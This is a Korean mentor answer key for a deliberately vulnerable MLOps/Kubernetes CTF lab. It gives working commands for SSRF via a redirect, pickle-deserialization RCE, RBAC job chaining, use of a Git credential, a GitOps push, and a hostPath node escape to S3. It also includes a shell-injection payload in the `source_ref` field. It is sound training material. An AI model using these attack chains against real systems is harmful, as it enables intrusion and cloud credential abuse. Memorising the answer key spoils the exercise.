# vuln-mlops 단계별 PoC — 멘토·운영진 답안지

> 단서, 요청 경로, 합성 Flag를 포함한다. 참가자에게 그대로 배포하지 않는다. Stage 1~3과 현재 배포된 2026-10-07 GitOps→hostPath→노드 IAM 경로를 먼저 설명한다. 아래쪽의 5-A/5-B는 이전 프로필의 기록이며 현재 풀이에 사용하지 않는다.

## 0. 시작점과 변수

허용된 `/32` 공인 IP에서 `http://3.35.2.114/docs`를 열어 OpenAPI와 공개 endpoint를 확인한다. EIP는 개인 EKS 관측값이므로 재배포 시 운영자가 교체한다. 아래 명령은 **저장소 루트에서** 실행하며 Bash, `curl`, `git`, Python 3.11 및 `requirements/dev.txt`의 고정 의존성이 설치된 격리 환경을 가정한다. `poc/ssrf_canary.py`와 `poc/rce_marker.py`는 운영진의 빠른 재현용 스크립트다. 참가자 명령에 AWS profile이나 `kubectl`은 없다.

```bash
export BASE=http://3.35.2.114
export PY=/tmp/vuln-mlops-poc-venv/bin/python
json_field() {
  "$PY" -c 'import json,sys; print(json.load(sys.stdin)[sys.argv[1]])' "$1"
}
curl -fsS "$BASE/api/system/info" | "$PY" -m json.tool
```

### 1-A — SSRF: 공개 URL에서 내부 canary까지

- **목표/경계:** webhook URL 검사가 허용한 첫 홉에서 클러스터 내부 canary로 리다이렉트되는지 확인한다.
- **단서:** `/docs`의 webhook 생성·test API와 `/api/system/info`의 canary service·namespace·port·path. 이를 조합한 실습 대상은 `http://lab-canary.stage-01-canary.svc.cluster.local:9000/canary`다.
- **스크립트가 하는 일:** [`poc/ssrf_canary.py`](../../poc/ssrf_canary.py)가 다음 순서로 공개 API를 호출한다.

  1. 내부 canary URL을 `https://httpbin.org/redirect-to`의 `url` 값에 넣어 외부 첫 홉을 만든다.
  2. `POST /api/webhooks`로 `REGISTERED_MODEL/CREATED` webhook을 만들고 ID를 받는다.
  3. `POST /api/webhooks/{webhook_id}/test`를 호출해 응답의 합성 canary 문자열을 검사한다.
  4. 첫 홉, 내부 대상, webhook ID, canary를 JSON 한 줄로 출력한다.
- **실행:**

```bash
POC_MODELGATE_URL="$BASE" POC_CANARY_TARGET=eks \
  "$PY" poc/ssrf_canary.py | "$PY" -m json.tool
```

- **증거:** `proof=ssrf`, `success=true`, `first_hop`, 위 내부 URL을 가리키는 `internal_target`, `canary=MODELGATE_INTERNAL_SSRF_PROOF`. 이 문자열은 합성 내부 서비스 도달 증거다.
- **발견성 한계:** 스크립트에는 `eks` 대상과 redirector가 이미 들어 있다. 이 실행은 공개 HTTP 경로의 동작 검증이며, 참가자가 단서를 보고 대상 URL과 리다이렉트 방법을 독자적으로 떠올리는지까지 검증하지 않는다. `POC_CANARY_TARGET`은 `eks` 또는 `compose`만 받는다.

### 1-B — 모델 검증 RCE: 데이터에서 validator 실행까지

- **목표/경계:** 공개 artifact/model API에 올린 모델이 validator의 `mlflow.pyfunc.load_model()` 경로에서 marker를 남기는지 확인한다.
- **단서:** `/docs`의 artifact 업로드, 모델 등록, validation job 조회와 RCE proof API. 실습용 MLflow/statsmodels 프로필은 의도적으로 고정되어 있다.
- **스크립트가 하는 일:** [`poc/rce_marker.py`](../../poc/rce_marker.py)가 모델 준비부터 proof 확인까지 처리한다.

  1. 정상 statsmodels 모델을 만든 뒤 `model.statsmodels` Pickle을 UUID 이름의 marker 파일만 쓰는 payload로 바꿔 ZIP을 생성한다.
  2. `POST /api/artifacts`로 ZIP을 올리고 반환된 `artifact_uri`로 `POST /api/models`를 호출한다.
  3. 반환된 validation job ID를 `GET /api/jobs/{id}`로 완료까지 조회한다.
  4. `GET /api/proofs/rce/{proof_id}`에서 marker 관측을 확인하고 foothold 경로를 출력한다.

  `--timeout 120`은 validation 완료 대기 시간이며 네트워크 요청에는 별도의 timeout이 있다.
- **실행 및 다음 단계 변수:**

```bash
RCE_JSON=$(POC_MODELGATE_URL="$BASE" "$PY" poc/rce_marker.py --timeout 120)
printf '%s\n' "$RCE_JSON" | "$PY" -m json.tool
FOOTHOLD=$(printf '%s' "$RCE_JSON" | json_field foothold_session)
API="$BASE/api/lab/footholds/$FOOTHOLD"
```

- **증거:** `proof=rce`, `validation_status=succeeded`, `evidence="validator marker observed"`, `proof_id`/`foothold_session` UUID, `next=.../self-rules`. `upload_id`, `artifact_uri`, `validation_job`은 어떤 업로드와 검증이 이 proof를 만들었는지 추적하는 값이다. 여기서 돌려주는 것은 marker 관측이며 임의 파일·명령 결과가 아니다.
- **발견성 한계:** 스크립트가 payload 생성·업로드·폴링·proof 조회를 모두 자동화한다. 따라서 스크립트 성공은 공개 참가자 API의 연결을 증명하지만, 블라인드 풀이에서 Pickle 역직렬화 지점을 스스로 찾는 난도는 별도로 평가해야 한다.

---

### 2 — RBAC: foothold에서 고정 Job과 로그까지

- **목표/경계:** `modelgate` ServiceAccount의 Job 생성 권한을 사용해 지정된 `stage-02-secret-reader` Job을 `monitoring-runner` 문맥으로 실행한다.
- **단서:** 1-B의 `next`와 `/self-rules`에 `stage-02-rbac`의 Job 생성/조회, Pod 로그 조회가 보인다.
- **PoC:**

```bash
curl -fsS "$API/self-rules" | "$PY" -m json.tool
curl -fsS -X POST "$API/stage-02/job" | "$PY" -m json.tool
for attempt in $(seq 1 60); do
  JOB_JSON=$(curl -fsS "$API/stage-02/job")
  if printf '%s' "$JOB_JSON" | "$PY" -c \
      'import json,sys; sys.exit(json.load(sys.stdin).get("succeeded", 0) < 1)'; then
    break
  fi
  sleep 2
done
printf '%s' "$JOB_JSON" | "$PY" -m json.tool
LOG_JSON=$(curl -fsS "$API/stage-02/log")
printf '%s' "$LOG_JSON" | "$PY" -m json.tool
printf '%s' "$LOG_JSON" | json_field encoded_proof | base64 -d
echo
```

- **FLAG/다음 단계:** `succeeded=1`과 `FLAG{stage_2_rbac_chaining_placeholder}`. 로그 응답의 다음 경로가 monitoring-session 조사로 이어진다. 참가자에게 임의 Job spec이나 직접 Secret 조회를 제공하지 않는다.

### 3 — Monitoring: topology reference에서 Git credential까지

- **목표/경계:** 완료된 Stage 2 Job을 근거로 monitoring-session relay가 고정 datasource와 topology query를 조회한다.
- **단서:** Stage 2 로그의 다음 경로, datasource `stage3-prometheus`, query 결과의 `credential_ref=stage3-lab-repo-writer`.
- **PoC:**

```bash
curl -fsS "$API/stage-03/datasources" | "$PY" -m json.tool
QUERY_JSON=$(curl -fsS "$API/stage-03/query")
printf '%s' "$QUERY_JSON" | "$PY" -m json.tool
REF=$(printf '%s' "$QUERY_JSON" | json_field credential_ref)
CREDS_JSON=$(curl -fsS "$API/stage-03/exchange/$REF")
printf '%s' "$CREDS_JSON" | "$PY" -c 'import json,sys; x=json.load(sys.stdin); x.pop("token",None); print(json.dumps(x,indent=2))'
```

- **FLAG/다음 단계:** `FLAG{stage_3_monitoring_trust_placeholder}`와 실습용 `username`/`token`, `stage4-lab` branch, `runtime-builder/` path, `git_gateway`, `application_status`. credential은 이 단일 실습 저장소의 제한된 쓰기용이다. 임의 reference 교환은 거부된다.

---

### 4 — 현재 경로: 제한된 Git 변경과 Argo 동기화

- **목표/경계:** Stage 3에서 얻은 credential로 `stage4-lab` branch의 `runtime-builder/deployment.yaml` 한 파일만 변경한다. `runtime-builder/README.md`와 baseline YAML이 escape worker 배치, UID/GID 10001, 읽기 전용 maintenance mount를 보여 준다. Argo가 push한 commit을 실제 `stage-05-runtime/runtime-builder`에 반영해야 한다.
- **멘토용 재현:** [`deploy/hostpath_capstone.py`](../../deploy/hostpath_capstone.py)는 검토된 이미지와 실습용 버킷을 받아 답안 YAML을 생성한다. 참가자에게 이 스크립트를 주지 않는다. credential을 URL에 넣거나 토큰을 출력하지 않는다.

```bash
export LAB_GIT_USER="$(printf '%s' "$CREDS_JSON" | json_field username)"
export LAB_GIT_TOKEN="$(printf '%s' "$CREDS_JSON" | json_field token)"
GATEWAY="$(printf '%s' "$CREDS_JSON" | json_field git_gateway)"
WORK="$(mktemp -d)"
cat > "$WORK/git-askpass.sh" <<'SH'
#!/bin/sh
case "$1" in
  *Username*) printf '%s\n' "$LAB_GIT_USER" ;;
  *Password*) printf '%s\n' "$LAB_GIT_TOKEN" ;;
esac
SH
chmod 700 "$WORK/git-askpass.sh"
export GIT_ASKPASS="$WORK/git-askpass.sh" GIT_TERMINAL_PROMPT=0
git clone --branch stage4-lab --single-branch "$BASE$GATEWAY" "$WORK/repo"
cat "$WORK/repo/runtime-builder/README.md"
git -C "$WORK/repo" config user.name lab-mentor
git -C "$WORK/repo" config user.email lab@example.invalid

"$PY" deploy/hostpath_capstone.py \
  --image ghcr.io/seung-ukk/vuln-mlops@sha256:64dcffccfe54b2b8a22006c379f16c6b5eac02f9bd24c70845145e0f4d2738d5 \
  --bucket vuln-mlops-personal-lab-707605822656-runtime-proof \
  --output "$WORK/repo/runtime-builder/deployment.yaml"
git -C "$WORK/repo" diff --check
git -C "$WORK/repo" diff --stat
git -C "$WORK/repo" add runtime-builder/deployment.yaml
git -C "$WORK/repo" commit -m "exercise hostPath node capstone"
git -C "$WORK/repo" push origin HEAD:stage4-lab
EXPECTED="$(git -C "$WORK/repo" rev-parse HEAD)"
```

`GET $API/stage-04/application`이 `sync=Synced`, `health=Healthy`, `revision=$EXPECTED`, `stage5_mode=hostpath`, `stage4_proof=FLAG{stage_4_gitops_placeholder}`를 함께 반환해야 한다. 이전 commit의 `Synced/Healthy`만 보고 성공으로 판단하지 않는다.

```bash
for attempt in $(seq 1 120); do
  STATUS_JSON="$(curl -fsS "$API/stage-04/application")"
  if printf '%s' "$STATUS_JSON" | "$PY" -c '
import json,sys
x=json.load(sys.stdin)
sys.exit(not (x.get("sync")=="Synced" and
              x.get("health")=="Healthy" and
              x.get("revision")==sys.argv[1] and
              x.get("stage5_mode")=="hostpath" and
              x.get("stage4_proof")=="FLAG{stage_4_gitops_placeholder}"))
' "$EXPECTED"; then break; fi
  sleep 5
done
printf '%s' "$STATUS_JSON" | "$PY" -m json.tool
```

### 5 — 현재 경로: hostPath에서 실제 노드 작업과 S3까지

- **첫 경계:** baseline Pod는 비루트이고 `/host-maintenance` mount는 읽기 전용이다. `readOnlyRootFilesystem`은 이미지 root에 적용되고 hostPath 쓰기 여부는 mount와 호스트 권한이 따로 결정한다. 운영자 probe는 비루트+쓰기 mount, root+읽기 전용 mount를 각각 거부했다.
- **의도된 경로:** 검토된 Deployment 변경으로 Pod가 escape worker의 고정 `task.sh`를 수정한다. 노드의 systemd path unit이 이를 감지해 host root로 실행한다. 스크립트가 노드 instance profile의 `vuln-mlops-escape-node` 역할로 실습용 S3 객체 `proof/final-flag.txt` 하나를 읽고, maintenance 디렉터리 밖의 `node-evidence/result.json`에 제한된 결과를 남긴다.
- **참가자 확인:** `stage-04/application`의 `node_result_endpoint`를 GET한다. 결과는 계정, assumed node-role ARN, `FLAG{stage_5_iam_placeholder}`만 포함한다. Git 변경만으로 결과 JSON을 위조하거나 Pod에서 직접 IMDS로 노드 역할을 쓸 수 없도록 검증했다.

```bash
RESULT_PATH="$(printf '%s' "$STATUS_JSON" | json_field node_result_endpoint)"
for attempt in $(seq 1 60); do
  HTTP_CODE="$(curl -sS -o "$WORK/node-result.json" -w '%{http_code}' "$BASE$RESULT_PATH")"
  if [ "$HTTP_CODE" = 200 ]; then break; fi
  sleep 5
done
test "$HTTP_CODE" = 200
"$PY" -m json.tool < "$WORK/node-result.json"
```

2026-10-07 공개 참가자 경로 검증에서 push revision은 `94a46e04e8ba329ee292d2ead39acdb49b1c1ad4`, Argo는 같은 revision의 `Synced/Healthy`, 결과는 계정 `707605822656`, old escape instance `i-0df552f4de9d7be88`의 assumed-role ARN과 합성 Flag였다. Falco의 `Lab escape host maintenance started` (`process=bash uid=0`) 이벤트가 CloudWatch에도 도착했다. IAM 시뮬레이터의 객체별 결과는 정확한 객체 `allowed`, 같은 버킷의 다른 객체 `implicitDeny`였다. S3 CloudTrail 데이터 이벤트는 없으므로 독립 AWS GetObject 이벤트 기록은 주장하지 않는다.

**운영자 복구:** 참가자 Git gateway에서 baseline Deployment로 다시 commit/push해 Argo revision을 확인한다. 작업이 실행된 escape EC2 인스턴스는 managed node group에서 drain·교체한다. 새 노드의 기본 `task.sh`, 결과 파일 부재, builder와 Falco/CloudWatch Ready를 확인한다. 고정 Stage 2 Job을 삭제하고 ModelGate를 재시작해 옛 foothold가 HTTP 404인지 확인한다. 이번 복구 revision은 `ff66336f6c1f633194c31306a98323a5d400a83d`, 새 instance는 `i-02e6ad123d5453a07`이다. 상세 이력은 [STATUS.md](../STATUS.md)를 따른다. 이전 프로필의 `reset --stage5-iam`은 사용하지 않는다.

---

## 이전 프로필 답안 기록 (2026-10-06, 현재 배포에는 적용하지 않음)

### 4 — GitOps: Gitea 변경에서 Argo reconciliation까지

- **목표/경계:** Stage 3 credential로 허용된 Git 경로를 수정하고 Argo CD가 새 revision을 실제 Deployment에 반영하게 한다.
- **단서:** exchange 응답의 gateway·branch·path와 clone한 `runtime-builder/README.md`. README는 baseline build가 꺼져 있고 legacy profile이 build/maintenance 경로를 연다고 설명한다.
- **PoC:**

```bash
GIT_USER=$(printf '%s' "$CREDS_JSON" | json_field username)
GIT_TOKEN=$(printf '%s' "$CREDS_JSON" | json_field token)
GATEWAY=$(printf '%s' "$CREDS_JSON" | json_field git_gateway)
GIT_URL=$("$PY" -c '
import sys
from urllib.parse import quote, urlsplit
base, user, token, path = sys.argv[1:]
parts = urlsplit(base)
print(parts.scheme + "://" + quote(user, safe="") + ":" +
      quote(token, safe="") + "@" + parts.netloc + path)
' "$BASE" "$GIT_USER" "$GIT_TOKEN" "$GATEWAY")
WORK=$(mktemp -d)
git clone --branch stage4-lab --single-branch "$GIT_URL" "$WORK/repo"
cat "$WORK/repo/runtime-builder/README.md"
git -C "$WORK/repo" config user.name lab-participant
git -C "$WORK/repo" config user.email lab@example.invalid
```

기존 `runtime-builder/deployment.yaml`에서 Pod template annotation과 **기존 컨테이너의 env 값만** 바꾼다. 아래 값은 답안지의 힌트이므로 블라인드 단서 발견성의 증거는 아니다.

```bash
"$PY" - "$WORK/repo/runtime-builder/deployment.yaml" <<'PY'
import sys
from pathlib import Path
import yaml

path = Path(sys.argv[1])
deployment = yaml.safe_load(path.read_text())
template = deployment["spec"]["template"]
annotations = template.setdefault("metadata", {}).setdefault("annotations", {})
annotations["lab.vuln-mlops/stage-04-proof"] = "FLAG{stage_4_gitops_placeholder}"
env = template["spec"]["containers"][0]["env"]
values = {"STAGE4_MODE": "git-controlled",
          "STAGE5_MODE": "iam-build",
          "BUILDER_MODE": "legacy-build"}
for item in env:
    if item["name"] in values:
        item["value"] = values[item["name"]]
path.write_text(yaml.safe_dump(deployment, sort_keys=False))
PY
git -C "$WORK/repo" diff --check
git -C "$WORK/repo" add runtime-builder/deployment.yaml
git -C "$WORK/repo" commit -m "enable both stage 5 exercises"
git -C "$WORK/repo" push origin HEAD:stage4-lab
EXPECTED=$(git -C "$WORK/repo" rev-parse HEAD)
```

`GET $API/stage-04/application`을 다시 조회해 `sync=Synced`, `health=Healthy`, `revision=$EXPECTED`, `stage4_proof=FLAG{stage_4_gitops_placeholder}`가 모두 맞아야 한다. Push 직후 **이전 revision의 Synced/Healthy**가 잠시 보일 수 있다.

```bash
for attempt in $(seq 1 120); do
  STATUS_JSON=$(curl -fsS "$API/stage-04/application")
  if printf '%s' "$STATUS_JSON" | "$PY" -c '
import json, sys
x = json.load(sys.stdin)
sys.exit(not (x["sync"] == "Synced" and
              x["health"] == "Healthy" and
              x["revision"] == sys.argv[1] and
              x["stage4_proof"] == "FLAG{stage_4_gitops_placeholder}" and
              x["runtime_relay"] and x["builder_endpoint"]))
' "$EXPECTED"; then
    break
  fi
  sleep 5
done
printf '%s' "$STATUS_JSON" | "$PY" -m json.tool
```

현재 두 문제용 응답에는 null이 아닌 `runtime_relay`와 `builder_endpoint`가 함께 나온다. Image, ServiceAccount, node selector, socket, volume은 수정하지 않는다.

---

### 5-A — Container runtime 경계: 독립 maintenance agent

- **목표/경계:** Git으로 활성화된 builder가 전용 escape worker의 `runtime-maintenance`에 고정 CRI 작업을 요청한다.
- **단서:** Gitea README의 별도 agent 설명과 Stage 4 application status의 `runtime_relay` 경로. agent 자체는 외부에 공개되지 않는다.
- **PoC:**

```bash
STATUS_JSON=$(curl -fsS "$API/stage-04/application")
RELAY_PATH=$(printf '%s' "$STATUS_JSON" | json_field runtime_relay)
test -n "$RELAY_PATH" && test "$RELAY_PATH" != None
curl -fsS -X POST "$BASE$RELAY_PATH" | "$PY" -m json.tool
```

- **FLAG/의미:** `proof=runtime`, `success=true`, `evidence="synthetic escape-node proof observed"`, `FLAG{stage_5_node_placeholder}`. 고정 containerd 작업과 합성 노드 proof가 확인된 것이며 임의 노드 장악은 아니다.
- **거부 사례:** 같은 POST에 `{"command":"id"}` body를 넣으면 HTTP 400 `Request body is forbidden`이 관측됐다.

### 5-B — Command injection에서 Pod IRSA·S3까지

- **목표/경계:** builder의 legacy `source_ref` 처리에서 셸 명령 조합을 확인하고, 앱 문맥의 IRSA로 정확히 한 실습용 S3 객체를 읽는다.
- **단서:** Gitea README의 `/workspace` legacy resolver 설명, Stage 4 status의 `builder_endpoint`, build info의 `input_field=source_ref`. `true`/`false` 입력의 `completed`/`failed` 차이로 셸 해석을 확인할 수 있다.
- **PoC:**

```bash
BUILDER_PATH=$(printf '%s' "$STATUS_JSON" | json_field builder_endpoint)
BUILD_INFO=$(curl -fsS "$BASE$BUILDER_PATH")
printf '%s' "$BUILD_INFO" | "$PY" -m json.tool
BUILD_PATH=$(printf '%s' "$BUILD_INFO" | json_field next)

curl -sS -o /tmp/stage5-before.json -w 'before_http=%{http_code}\n' \
  "$API/stage-05/aws-proof"
curl -fsS -X POST "$BASE$BUILD_PATH" \
  -H 'Content-Type: application/json' \
  --data '{"source_ref":"main; cd /opt/modelgate && python -m runtime_builder.aws_proof; #"}' \
  | "$PY" -m json.tool
curl -fsS "$API/stage-05/aws-proof" | "$PY" -m json.tool
```

- **FLAG/의미:** 실행 전 proof는 HTTP 404, build는 `status=completed`, 이후 proof는 계정 `707605822656`, `assumed-role/...runtime-builder/...` ARN, `FLAG{stage_5_iam_placeholder}`다. `cd /opt/modelgate`는 subprocess의 시작 디렉터리가 `/tmp`이기 때문에 필요하다. IRSA 정책은 `proof/final-flag.txt` 한 객체의 `s3:GetObject`만 허용한다. 앱은 AWS credential이나 임의 stdout을 반환하지 않는다.

### 이전 프로필의 관측 결과와 운영자 초기화

가장 최근 공개 EIP 수동 검증에서 Stage 4 commit `533820aeef879422ba8735f7724a22b78fedbe1c`가 Argo `Synced/Healthy`로 반영됐고 5-A/5-B가 모두 성공했다. 5-A body 거부도 HTTP 400으로 확인했다. 이 검증에는 payload·설정값 힌트가 포함되므로 팀원의 완전한 블라인드 풀이 가능성을 별도로 확인해야 한다.

팀 실습 전 운영자는 [`STATUS.md`](../STATUS.md)의 현재 digest와 배포 상태를 확인하고 `deploy/eks-lab/orchestrate.sh reset --stage5-iam`으로 실습 Git branch, Job, 일시 proof를 baseline에 되돌린다. 최신 수동 풀이 후 사용자가 실행한 reset의 출력에서 Argo `Synced/Healthy`(revision `290827d73848a9a6235ca3d537ea4b1fd363cfe0`)와 runtime-builder·runtime-maintenance `1/1` Ready를 확인했다. 공유된 출력만으로 개별 Job·proof 삭제를 독립 확인한 것은 아니다. 참가자 PoC에 운영자 `kubectl exec`를 섞지 않는다. Stage 6 CSI/EBS/EFS는 미구현이다.

관련 설명은 [운영진 소개서](MENTOR_LAB_OVERVIEW_2026-10-07.md), [Stage 계약](../STAGE_CONTRACTS.md), [참가자용 IAM 보충](../PARTICIPANT_IAM_POC.md)을 참고한다.
